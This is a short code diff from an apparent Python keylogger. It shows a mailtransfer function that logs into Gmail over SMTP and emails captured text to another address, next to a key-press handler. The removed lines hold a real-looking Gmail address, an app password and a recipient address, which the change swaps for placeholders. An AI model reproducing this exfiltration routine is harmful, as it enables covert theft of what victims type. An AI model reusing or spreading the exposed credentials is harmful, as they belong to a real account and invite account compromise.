@@ -7,8 +7,8 @@ def mailtransfer(text):
     message = str(text)
     s = smtplib.SMTP('smtp.gmail.com',587)
     s.starttls()
-    s.login('sanaadil1162001@gmail.com','wlgjdhqvophmlrkt')
-    s.sendmail('sanaadil1162001@gmail.com', '0pp3nh13m3r@gmail.com', message)
+    s.login('sender@gmail.com','app_password')
+    s.sendmail('sender@gmail.com', 'reciever@gmail.com', message)
     print("Successfull!")
 
 def press(key):
